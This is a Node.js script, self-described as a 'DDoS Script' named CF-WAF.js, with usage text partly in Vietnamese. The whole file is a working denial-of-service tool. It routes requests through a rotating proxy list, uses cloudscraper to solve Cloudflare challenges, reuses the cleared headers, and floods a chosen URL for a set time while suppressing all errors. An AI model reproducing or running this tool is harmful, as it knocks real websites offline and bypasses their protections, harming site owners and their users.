require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper')

if (process.argv.length < 6) {
    console.log(`
\x1b[31m ERROR\x1b[37m: Nhập thiếu dữ liệu
\x1b[36m USAGE\x1b[37m: node CF-WAF.js [URL] [TIME] [REQ_PER_IP] [PROXYLIST]
\x1b[32m EXAMPLE\x1b[37m: node CF-WAF.js http://example.com 60 100 http.txt
\x1b[93m DDoS Script by:\x1b[34m OverKill\x1b[0m `);
    process.exit(0);
}
const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    let getHeaders = new Promise(function (resolve, reject) {
        CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        }, function (error, response) {
            if (error) {
                let obj_v = proxies.indexOf(proxy);
                proxies.splice(obj_v, 1);
                return;
            }
            console.log(`\x1b[32mSent Request Attack To ${target} Success\x1b[0m`);
            resolve(response.request.headers);
        });
    });

    getHeaders.then(function (result) {
        for (let i = 0; i < req_per_ip; ++i) {
            CloudScraper({
                uri: target,
                headers: result,
                proxy: 'http://' + proxy,
                followAllRedirects: true
            }, function (error, response) {
                if (error) {
                    console.log('\x1b[31m' + error.message + '\x1b[0m');
                }
            });
        }
    });
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});